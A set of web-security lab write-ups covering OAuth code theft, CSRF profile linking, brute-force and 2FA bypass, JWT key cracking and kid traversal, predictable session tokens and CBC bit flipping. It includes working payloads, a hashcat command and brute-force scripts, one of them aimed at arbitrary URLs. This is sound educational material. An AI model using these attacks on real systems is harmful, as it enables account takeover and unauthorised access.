### OAuth account hijacking via redirect_uri
#### Lab
The lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, we have to steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter. 

<b>Workflow</b><br/>
Login to the portal using wiener social media profile, then log-out and click my account again, you will notice that you don't need to insert wiener credentials again, you can directly continue to the home page. Inspect the flow, you can notice the request containing the <b>auth code in the query string.</b>

Send the request to Repeater, trying to modify the <b>redirect_uri parameter</b> to poin to the exploit server and we don't get any error in the response. This parameter is used to generate the redirect, and we can control it. Follow the redirect (1)  
<br>![img](./img/5.png)<br>
You will land to the exploit server home page.
<br>![img](./img/6.png)<br>
If you access the exploit log server page you will find the entry associated to the previous request (1).

We can take advantage of this vulnerability to craft a payload to get the administrator credential, to do that change the <b>redirect_uri</b> to point to the exploit server (2), then we use our client_id (1) and the other needed paramters (3, 4) to complete the OpenID Connect Flows
<br>![img](./img/8.png).<br>
Note that if the value of <b>response_type is code</b>, but <b>openid is not included in the scope request parameter</b>, the request is just an authorization code flow. On the other hand, if openid is included in the scope request parameter, an <b>ID token is issued from the token endpoint</b> in addition to an access token.
Save the payload (5), if you view it (6), you will notice in the access log (8) that an entry is present with a new code token for the current user.
Not that here
 the authentication flows <b>miss to semantic validate the client_id parameters</b>, since we are providing our own to get the authorization code for a different user.

After delivered to the victim the payload (7), we can inspect the exploit access log (8) to get the leaked code:
<br>![img](./img/9.png)<br>
Now we can use the code's value to access the portal, bypassing the authentication process:
     
     https://YOUR-LABID.web-security-academy.net/oauth-callback?code=T2QW7SXUMEHWY_bpSSTnNucJRfhWhQRtbj2GQpqAINC

#### References
- https://darutk.medium.com/diagrams-of-all-the-openid-connect-flows-6968e3990660
- https://www.oauth.com/oauth2-servers/client-registration/client-id-secret/
- https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type

### Forced OAuth profile linking
#### Lab
The lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website. 

Proceed to attach the social media profile to the blog account, once done logout and try to login using the social media profile option, you should be able to get in. Inspecting the autorithation flow we can see that the application does not send the <b>state</b> parameter (1), permetting a CSRF attack
<br>![img](./img/125.png)<br>

Even the redirection performed by the authorization server, of course, does not containg the state parameter, but only the authorization code generated by the authorization server.
<br>![img](./img/126.png)<br>

After that the application should use the authorization code to get an access token, performing a POST request to the serviceâ€™s token endpoint. This step is missing in the Lab, or I have missed the request in Burp ðŸ˜¥. The important thing here that we can trick an administrator to make a request containing our authorization code that it will be associated with her profile, to do that we have to intercept the request containing our code, drop it, otherwise the code will be invalidated, and craft an exploit to be delivered to the administrator user.
So first of all enable Interception in Burp, then from <b>my-account page click again on Attach a social profile</b>
<br>![img](./img/127.png)<br>

Forward the first request, then the second should be the one containing the auth code, right click and copy the URL (1)
<br>![img](./img/128.png)<br>

and drop the request. Now log-out from the blog, <b>go to the exploit server and insert the following payload into the Body</b>
```
<iframe src="https://0af900c8036259bcc043118a00a800ba.web-security-academy.net/oauth-linking?code=g6MeFfYAt9eEXUd_707knVmgZxRLIYYeIM1q9Oxe_lw" width=0 height=0></iframe>
```
Click Store and the Deliver to the victim, once the admin user will visit the the exploit the pending OAuth flow will be completed using your social media profile, attaching it to the administrator account.

Now log-in again using <b>Log in with social media</b> and you should get in as an administrator user 

#### References
+ https://auth0.com/docs/secure/attack-protection/state-parameters
+ https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type 

### Multi-step process with no access control on one step 
### Lab
This lab has an admin panel with a flawed multi-step process for changing a user's role. 
To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
Before to promote a user as admin 
<br>![img](./img/83.png)<br>

A confirmation step is required. In this step an hiddne input field is sent to validate the action as show below
<br>![img](./img/84.png)<br>
In this scenario, since no security mechanism are implemented in the confirmation step, we can easely promote oruselves to an admin user. Let's try lo open an incognito session in the browser to login as a normal user (wiener)
<br>![img](./img/85.png)<br>
Now in the legitim request made before by the administrator to promote carlos, we can just change the cookie session to ours (1) and the username parameter according (2):
<br>![img](./img/86.png)<br>
Submitting the modified request we solve the lab

#### References:
+ https://portswigger.net/web-security/access-control

### Broken brute-force protection with IP block
#### Lab
This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

Trying to brute-force the login we can notice that after 3 failed attempts we are blocked for 1 minute, so a lock-out policy it is in place. Now it is quite common that the policy is based on the IP address of the incoming request. Poorly configured policy reset the failed counter attempts after a successfull login, we can try to verify this configuration using the following approach within a minute:
+ 2 failed login using carlos as username
+ a succefull login as user wiener
+ another failed attempt as user carlos
The result is that we are not blocked, so we can try to brute-force the login using the following sequence:
+ login brute-force attempt 1
+ login brute-force attempt 2
+ successfull login user wiener credentials
+ login brute-force attempt 3
+ login brute-force attempt 4
+ successfull login user wiener credentials
+ ...

and so on. To solve this lab I used Turbo Intruder exstension, you can get more information in the reference section about this toool. I created a custom list to feed Turbo intruder based on the passwords list provided: https://portswigger.net/web-security/authentication/auth-lab-passwords, that implements the sequence schema illustrated above. You can download the customized list for Turbo Intrudere [here](./file/wl_auth.txt).

Once we have intercepted a login request we can send it to Turbo Intruder, here I configured the Python payload to execute a request after another, so I set
```
concurrentConnections=1,
requestperConnetction=1,
```
and the wordlist that I created. The payload will send a request for each line in the file, replacing the <b>%s</b>
value with the a single payload row of the file, then if the response is not a 404 error, is added to the list results.
<br>![img](./img/87.png)<br>

Now lunch the attack, go for a coffee since it will take some time (in Burp CE using Turbo Intruder the requests are throttled). 

In the result's table to find out if we succeed, we have to order the results for the state, looking for 302 responses (redirection to the account details), filter out those related to wiener, we should see a request having carlos as username, the value of the password parameter is the one that is correct.
<br>![img](./img/88.png)<br>


#### References:
+ https://blog.intigriti.com/2022/03/01/hacker-tools-turbo-intruder

### Brute-forcing a stay-logged-in cookie
#### Lab

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
Your credentials: wiener:peter
Victim's username: carlos
[Here](https://portswigger.net/web-security/authentication/auth-lab-passwords) you can download the password's wordlist. 

First of all log-in using wiener credentials, check the option to <b>Stay logge in</b>, inspect the request for the <b>my-account page</b> you will notice that a cookie <b>stay-logged-in</b> is set, the value is encoded in Base64, using Inspector we can infer that could be in the form of username:encoded_password, the username is in plain text. 
<br>![img](./img/129.png)<br>
The I used a Python script, [hash-id](/file/hash-id.py), to try to guess the encoding form, that could md5.
<br>![img](./img/130.png)<br>
Knowing that we can think to brute-force the password for the user carlos, setting the cookie vakue according. The process that I followed was: 
- create a wordlist containing the payloads  <b>b64(carlos:md5(password))</b>, the password value are taken from the provided password wordlist
- using Turbo Intruder to brute-force the cookie for the user carlos, in this process we have to check if the server response contains the phrase <b>Update email</b> since this feature is available only if you are successfully logged-in

To generate the cookie encoded wordlist I used [this](./file/create_session_cookie.py) Python script. The script read the passwords contained in a file, encode the value in md5, then encode the string carlos:md5_password_hash in base 64 and save the value in another file. There is even a test case where you can verify that the hash value for the md5 encoded password and the cookie value for stay-logged-in for wiener. You can download the generated list with the encoded cookie [here](./file/cookieB64.txt).

Then we can proceed using Turbo Intruder to try to brute-force the cookie for carlos, before to proceed log-out from the blog, then try to access my-account, intercept the request (you will be redirect to the log-in page) and send to intruder. Set the payload placeolder (1) and the condition to add the entry in the result table (2)
<br>![img](./img/131.png)<br>
After a while you should see the entry added to the result containing the cookie value used to access the account page of carlos
<br>![img](./img/132.png)<br>
The lab should be solved

### JWT authentication bypass via weak signing key
JWT attacks involve a user sending modified JWTs to the server in order to achieve a malicious goal. Typically, this goal is to bypass authentication and access controls by impersonating another user who has already been authenticated. 
#### Lab
<i>Please note that you have installed the JWT editor exstension to follow the solution</i>
This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced. To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

Let's login as wiener user, going to the proxy histoty we can notice that, having the JWT editor installed, 3 tows are highlighted
<br>![img](./img/106.png)<br>

send the request to the account page to the Repeater. Passing to the JSON Web Token tab we can see out JWT decoded
<br>![img](./img/107.png)<br>

Now being authenticated as wiener, tring to send the request to the admin panel, we can notice that the admin panel is only accessible by the administrators. 
<br>![img](./img/108.png)<br>

Knowing that the secret key is weak we can use hashcat to brute-force it. You can get the wordlist to use from [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list). I used the following command:
```
.\hashcat -m 16500 eyJraWQiOiJiMTNjZGEzMS02MDNlLTQ2MjQtYjc0MS0wYWU1ZDIxNTMxYmQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NDIyNjQxN30.T0XcbTnWQ1MWDn5ZcfU46AEU0i1K4Ta5yhuiCWby_lM "D:\wordlists\jwt.secrets.list.txt"
```
The m switch value refers to the JWT token mode, fallowed by my JWT token value, the third parameter is the wordlist path file to use to brute-force the token. After some seconds the secret key is cracked:
<br>![img](./img/109.png)<br>

Now let's proceed to encode the secret in B64 format:
```
c2VjcmV0MQ==
```
Then we generate a new symmetric key as follows:
select JWT editor keys (1), then New symmetric key (2), in the newly opened window click Generate (3), in the new generated key replace the value of the <b>k</b> property with the encoded value of the secret found in the previous step, then click OK (4). 
<br>![img](./img/110.png)<br>

Now switch back to Repeater, in the JSON web token tab
, modify the sub value as administrator (1), then click Sign (2), in the newly open window select the key that we have previously generated (3), then click Ok (4). Now notice that the hex value of the signature is changed (5).
<br>![img](./img/111.png)<br>

Resend the request to the admin page using the modified token and we should be able to access the admin page
<br>![img](./img/112.png)<br>

Now sendig the following request to solve the Lab:
```
/admin/delete?username=carlos
```

#### References
+ https://portswigger.net/web-security/jwt
+ https://stackoverflow.com/questions/31309759/what-is-secret-key-for-jwt-based-authentication-and-how-to-generate-it
+ https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite
+ https://hashcat.net/wiki/doku.php?id=hashcat

### JWT authentication bypass via kid header path traversal
The JWT header kid (Key ID) provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter. 
#### Lab
The lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, we have to forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter.

<i>To solve the lab you need to install <b>JWT editor keys exstension</b>, note that my lab ID (and session) could change during the current explanation</i>

Let's login and then try to access the admin page, we can see that a JWT is used to grent access to the admin page, we can inspect it opening the correspondig tab (1). Notice the presence of the kid's header (2)
 <br>![img](./img/169.png)<br>
We can test if the parameter is vulnerable to directory traversal, the we wiil force the server to use an arbitrary file from its filesystem as the verification key, one of the simplest methods is to use <b>/dev/null file</b>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, <b>signing the token with a empty string will result in a valid signature</b>. In windows the <b>nul file</b> has almost the same function of /dev/null (e.g. echo 1 > nul). To try to exploit this vulnerability we also need the token to be signed using a <b>symmetric algorithm: HS256</b>. From the above image (3) we can see that even this condition is met.

Now let's proceed to create the symmetric signing key (2) using the JWT keys editor (1). Set the value of the <b>k property with a Base64-encoded null byte (3), AA==</b>, because the JWT Editor extension won't allow to sign tokens using an empty string. 
 <br>![img](./img/170.png)<br>
The new key is generated and we can use to sign our malicious JWT. Go back to Repeater JWT (1) and modify the JWT in the admin request as follows:
<br>![img](./img/171.png)
2 change the kid value to /dev/null
3 change the sub value to administrator
4 sign the modified token using the generated key in the previous step
5 click OK in the select key window

Now if we send the request for the admin page again we get 401, probably this is due to the incorrect setting of the /dev/null file path, we need to escape from the current directory, so after some try and errors I found tha we need seven escape, so the corret value the kid header is

     "kid": "../../../../../../../dev/null"

Change the value according, re-sign the modification and send it to the server, then you should be able to access the admin panel. Find the URI in the response to delete the user carlos and send a GET request to the endpoint, or change the session JWT cookie value with the one we crafted in the current browser session to click the link using the WebUI.

#### References
- https://portswigger.net/web-security/jwt

### 2FA broken logic
#### Lab
 The lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

+ Your credentials: wiener:peter
+ Victim's username: carlos

We also have access to the email server to receive your 2FA verification code. 

Log-in as wiener and we are redirected to the <b>login2 page</b> where the MFA code is required, here we can notice that the a cookie called verify (1) is set with the username of the one is trying to authenticate. Check you email client and you will get the MFA code, that is sent to the server with the <b>mfa-code parameter</b> (2).
 <br>![img](./img/161.png)<br>
 <i>Please note that from now on my Lab ID is changed.</i>
Now we can try to exploi the authentication logic since the POST login2 request associates the MFA to the user using the cookie verify only, without considering the previous authentication step using password. Performing multiple request for the MFA we can infer that the code is a permutation of the decimal number system (0-9), having a max length=4.

Knowing that we can try to brute-force this value for carlos user, we can proceed as follows:
1. Log-out from the wiener account
2. Perfor a GET request to the login2 page and send it to Repeater, change the verify cookie value to carlos (1)  <br>![img](./img/162.png)
3. Send the request so a MFA code will be generated for carlos
4. Log-in again as wiener, then in the login2 page submitt an invalid MFA token (e.g aaaa)
5. Send the POST login2 request to Turbo Intruder and configure the attack as follows <br>![img](./img/163.png)<br>
Change the verify cookie value to carlos (1), set the placeholder attack parameter for mfa-code (3). Using intertools python 3 module we can easely generate a list to brute-force the MFA code value (3). You can download the Turbo Intruder python code from [here](./file/TI_mfa_bf.py).
6. Lunch the attack, after a while you should get the entry in the results table (1) with the response status equals to 302 (2), that means we got a <b>valid redirect to my-account page</b> using the indicated MFA code (3)<br>![img](./img/164.png)
7. Right-click into the request body and choose <b>Show response in browser</b> (4), copy the provided link in your browser's address bar and you should access as carlos user 

### Predicatble session tokens generation
<i>All the code snippets are in Python3</i>
#### LAB
Actually this is not a Portswigger LAB, indeed it is based on a real PT activity where we inspected session token's generated by a custom web app (J2EE). A custom mechanism was coded in a servlet that returned the token in a cookie. Concurrent authenticated session were allowed, so a user could have more valid authentication cookies associated to her (that actually is quite a normal behaviour). We were provided with a valid account to access the application as a normal user, through this account we were able to collect 1000 valid tokens. The tokens were base64 encoded:

     bGxtYWx5eWFlZTE2Nzg5NzkwNTc=

The decoded value is

     llmalyyaee1678979057

At a first sight it looked quite robust, but submitting the whole captured list to Burp sequencer revealed a very poor randomness:
<br>![img](./img/180.png)<br>
We loaded the [token's list](./file/tokensB64.txt) (2) into Burp sequencer, we set the B64-decode option before to procede (3). Indeed analyzing the [decoded tokens list](./file/tokens.txt) we can infer that the token is composed by 2 parts:

     {llmalyyaee:alphabetic length 10}+{1678979057:numeric length 10}

The numeric part was obviously (a colleague said :)) a UTC date-time stamp, that actually it's true:
```python
import datetime
print(datetime.datetime.fromtimestamp(1678979057))
#2023-03-16 16:04:17
```
Check it out at: https://www.unixtimestamp.com. Further inspecting the decoded tokens list file we noticed a recurring series of letters in the alphabetic parts. Even the length is 10 actually only 5 letters are used:
```python
f = open("tokens.txt","r").read()
uc = set(f)
print(len(uc))
# 16
>>> print(uc)
#{'1', 'l', '4', 'y', 'e', '\n', '3', '0', '8', '6', '7', 'm', '2', '9', '5', 'a'}
# so the unique alphabet letters are: lyema
```
So we got 2 valid session tokens for our user:

     bGxtYWx5eWFlZTE2Nzg5NzkwNTc=
     bHltbHlsZWV5bDE2Nzg5NzkxMTE=

Decoding them we got:

     llmalyyaee1678979057
     lymlyleeyl1678979111

We got the first token at 2023-03-16 16:04:17 (1678979057) and the second at 2023-03-16 16:05:11 (1678979111), in the meanwhile we knew that an IT guy logged in, so we knew that between this time span at least another token was granted. Looking at the UTC stamp we can see that we only need to cycle <b>from 1678979058 to 1678979110</b>, before that we need to get all the possible combinations between the 5 letters <b>lyema</b> having a string's length of 10.
Python really helped to perform the task, we used a multiprocess approach to speed up the operation. Follows is the script:

```python
import base64
import sys

#the UTC stamp span in which the valid tokens was created
r1 = range(1678979058,1678979110)

def search(v):
    valid_token = sys.argv[1] #read the token to search
    for x in r1: #this is the part of the token's range between our 2 valid tokens
        current_token = ''.join(v) + str(x)
        tkb64 = base64.b64encode(current_token.encode('ascii')).decode('ascii')
        #print(valid_token + ":" + tkb64)
        if tkb64 == valid_token:
            print("Found " + tkb64)
###################################################################################################

def access(v):

    import requests

    url = sys.argv[1] #read the URL to access
    
    for x in r1: #this is the part of the token's range between our 2 valid tokens
        current_token = ''.join(v) + str(x)
        tkb64 = base64.b64encode(current_token.encode('ascii')).decode('ascii')
        ck={'__SESSION_ID__':tkb64}
        resp = requests.get(url,cookies=ck)
        if resp.ok:
            print("Valid token to access is: " + tkb64)
######################################################################################################

if __name__ == '__main__':

    from itertools import product
    from multiprocessing import Pool

    cpus = 8 #adjust this value considering yours available CPU. You can get the number as follows: multiprocessing.cpu_count()
    
    pool = Pool(cpus)
    # 100 is buffer size multiplier - the number of itmems that each process will get
    buff_size = 100 * cpus  
    buff = []

    #These are the random letters  used to create the alphabetical part of the token
    letters = ['l', 'y', 'e', 'm', 'a']

    #This is the length of the alphabetical part of the token
    alph_tok_len = 10
    
    if len(sys.argv) != 2:
        print("You can pass a b64 encoded token to test, e.g. " + sys.argv[0] + " bHllYWVsbXl5bTE2Nzg5NzkwODI=")
        print("Or you can try to get access to the URL that you pass, e.g. " + sys.argv[0] + " https://site_2.test/auth_resource")
    else:
        # Using the itertools.product we can get all the possible combinations between the letters, in a repeatition of 10.
        for i, r in enumerate(product(letters, repeat = alph_tok_len)):
            if (i % buff_size) == (buff_size-1):
               # we execute requests
                if sys.argv[1].startswith("http"):
                    pool.map(access, buff)
                else:
                    # we test the b64 token
                    pool.map(search, buff)
                buff = []
            else:
                buff.append(r)

        if len(buff) > 0:
            if sys.argv[1].startswith("http"):
                pool.map(access, buff)
            else:
                pool.map(search, buff)
            buff = []
```
The logic of the scripts should be quite clear:
1. We cant use the script to test a B64 token or passing a URL (including the protocol) to try to access a resource that requires authenthication, passing in the request the generated cookie token
1. We get all the possible combinations of the lyema string using itertool.product with a repeatition of 10
1. We split the results in  block of 100 and we process these blocks simultaneously using pool.map 

With this configuration, using 8 CPUs, it took 3 minutes to discover the valid token

#### Prologue
The algorithm using to create the token was the follows (here translated in Python):

```python

def create_token_session_ID:

    letters = ['a','m','e','l','y'] #string.ascii_lowercase
    ts = round(time.time())
    inc = (''.join(random.choice(letters) for i in range(10)))
    
    tkpln = inc + str(ts)
    
    tkb64 = base64.b64encode(tkpln.encode('ascii')).decode('ascii')
    
    return tkb64

```
Actually we found out that the letters array used (5 elements) was expected only in the testing phase, in the production the array had to be

        letters = string.ascii_lowercase
        print(letters)
        #abcdefghijklmnopqrstuvwxyz
        
Using this array of values will increase the randomness quit
e lot, even if it is not the best approach. We tried to regenerate the tokens using the whole lowercase alphabet's letter and Burp sequencer reported the following:
<br>![img](./img/181.png)

So in this case the code used in the testing phase was left in the production leading to a serious vulnerability

### CBC bit flipping attack
#### Lab
Before to start, in case you don't know the matter I really suggest to have a look at the refernce section where you can find resources about CBC bit flip attack.
Actually this LAB is based on [mutillidae 2](https://github.com/webpwnized/mutillidae) vulnerability. In the project home page you can find detailed instructions how to set up and run the web application, as usual don't expose the app outside a LAB enviroment, use host-only adapter. For this Lab we will set the security level to 0, you can access the vulnerable page at

    https://<local_lab_IP>/index.php?page=view-user-privilege-level.php&iv=6bc24fc1ab650b25b4114e93a98f1eba

![img](./img/182.png)<br>

Send the page request to Burp Repeater and we can notice that there is a quite self-explanatory iv parameter in the query string :).

    GET /index.php?page=view-user-privilege-level.php&iv=6bc24fc1ab650b25b4114e93a98f1eba
First of we have to sse if the parameter (as the name suggest) it is used as initial vector for the CBC encryption, let's try to chage a single characters in the parameter:
![img](./img/183.png)<br>
As we can see changing the first character of the iv parameter to 0 we were able to modify the APP id value in the server response, so the parameter seems to be vulnerable. Morover the parametes seems to be hexadecimal encoded, we know that a byte is always represented by 2 Hex characters in the range 00 to FF. So we can infer that eache pair of letters represent a byte. Of course we can take advantage of the bit flip attack of Intruder to observe how the application react to the attack:
![img](./img/184.png)<br>
A shown in the above image we proceed as follows:
1. Select attack type as Sniper
1. Select the position of the parameter as the iv value
1. Navigate to the payloads tab
1. Select bit flipper as type, leave the other settings as presented
1. Go the settings tab
1. Scroll down to the Grep extractor section and add the two expression to check the User ID and Group ID value in the response. Clicking the Add button you will be able to navigate the server response and to select the Start and the end expression to capture.

Lunch the attack, event if in the CE Burp edition the requests are throttled it wont take too much to terminate (5 minutes more or less). Inspecting the response we can see that actually we got both the root value, but separately in 2 differents requests:
![img](./img/185.png)<br>

So we have the following value for the iv parameter to get the root user ID 00 (separated in bytes)

    6b c2 4f c1 [aa] 65 0b 25 b4 11 4e 93 a9 8f 1e ba
Comparing to the original request
    
    6b c2 4f c1 [ab] 65 0b {25} b4 11 4e 93 a9 8f 1e ba
 we can notice that in the original request the changed byte is at the fifth position, in square brackets 

 Morevore to obtain the root group ID 00 we need to change the byte at the position 8, in curly brackets

    6b c2 4f c1 ab 65 0b {24} b4 11 4e 93 a9 8f 1e ba
So in order to solve the lab we have to marge the 2 requests al follows: <b>6bc24fc1aa650b24b4114e93a98f1eba</b>, passing this value ad iv parameter.

#### Increase the security levet to 1
In this case change only 2 bytes is not enough to solve the lab, indeed we need to change 6 bytes. In this scenario I used Turbo intruder to speed up the things. But before to code the script let's inspect the pattern we need to set in the iv parameter:

    6b c2 4f c1 [ab 65 0b] {25 b4 11} 4e 93 a9 8f 1e ba

<i>Please change the protocol to HTTP from now on, since Turbo Intruder will raise an error related to che TLS certificate using https.</i>
If we lunch again the bit flipping attack in Burp (or just play a bit around with the bytes at 5 and 8 positions) we can find that the following iv value 6bc24fc1<b>aa</b>650b<b>27</b>b4114e93a98f1eba produces User ID 074 and Group ID 035. Now to solve the lab we need to find others 4 bytes, 2 for the user ID and 2 for the group ID. The schema is the following:

    6b c2 4f c1 aa [?? ??] 27 {?? ??} 4e 93 a9 8f 1e ba 
As told before we will use Turbo intruder to brute-force the bytes, we will complete the task in 2 steps, the first is to find the 2 bytes for the user ID and then to proceed to find the others 2 bytes for the group ID. In Turbo Intruder we will set the placeholder in the iv parameter as follows:

    6bc24fc1aa%s27b4114e93a98f1eba 

using the following script:
```python
from itertools import product

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
   
    for word in list(map(''.join, product('0123456789abcdef', repeat=4))):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if "000 (" in req.response:
        table.add(req)

```
Here we import the product function from itertools to get the cartesian product, having a length of 4 (2 bytes), for all the possible hexadecimal characters value. For each value we will send a request to the server, checking if in the response is present the string <i>000 (</i> that indicates we have found the correct bytes sequence for the root user ID.
Lubching the attack, using 5 concurrent connections, with 100 requests for each, after some minutes (10 more or less, considering that the product cartesian result is a list of 65536 elements) we will get the correct request:
![img](./img/187.png)<br>
So the 2 bytes that we need to get the root user ID are: <b>620f</b>. We can now proceed using the same script, changing the placeholder position as follows:

    6bc24fc1aa650b27%s4e93a98f1eba
To brute-force the group ID bytes. After a while we will get the following results:
![img](./img/188.png)<br>
So the bytes to get the root group ID are: <b>b714</b>. Again merging all together we will obtain the followin iv value that permits to us to solve the LAB

    6bc24fc1aa620f27b7144e93a98f1eba
![img](./img/186.png)


#### References
- https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/
- https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511
- https://repository.root-me.org/Cryptographie/EN%20-%20SANS%20Institute%20AES%20CBC%20Bit%20Flipping.pdf

